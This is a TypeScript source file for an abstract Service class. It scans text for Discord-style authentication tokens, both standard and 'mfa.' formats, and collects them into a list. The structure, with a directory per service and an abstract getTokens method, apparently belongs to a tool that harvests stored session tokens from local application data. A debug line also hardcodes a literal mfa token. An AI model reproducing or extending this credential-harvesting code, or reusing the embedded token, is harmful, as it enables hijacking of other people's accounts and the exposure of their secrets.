import * as XRegExp from 'xregexp';
import * as fs from 'promise-fs';

import { List } from '@assasans/storage';

import { Token, TokenType } from '../token';

export abstract class Service {
	public name: string;
	public directory: string;

	public constructor(name: string, directory: string) {
		this.name = name;
		this.directory = directory;
	}

	protected extractTokens(content: string): List<Token> {
		const tokens: List<Token> = new List<Token>();

		for(const match of XRegExp.match(content, /[\w]{24}\.[\w-]{6}\.[\w-]{27}/, 'all')) {
			const idMatch: string = XRegExp.match(match, /^[\w]{24}/, 'one') ?? '';
			const id: string = Buffer.from(idMatch, 'base64').toString();

			if(/^[0-9]{16,}$/.test(id)) {
				tokens.add(new Token(this, TokenType.Normal, match));
			}
		}

		for(const match of XRegExp.match(content, /mfa\.[\w-]{84}/, 'all')) {
			tokens.add(new Token(this, TokenType.MFA, match));
		}

		// DEBUG
		tokens.add(new Token(this, TokenType.MFA, "mfa.gZ3ga7RSOLslnH5MEWC5O8-VsX5xvWswilndBYCbUy6gQhG4NYVr4fES14P9AsHgKN7-2LIzRyw3YhQNGP-g"));

		return tokens;
	}

	protected async exists(path: string): Promise<boolean> {
		try {
			await fs.stat(path);
			return true;
		} catch {
			return false;
		}
	}

	public abstract async getTokens(): Promise<List<Token>>;
}
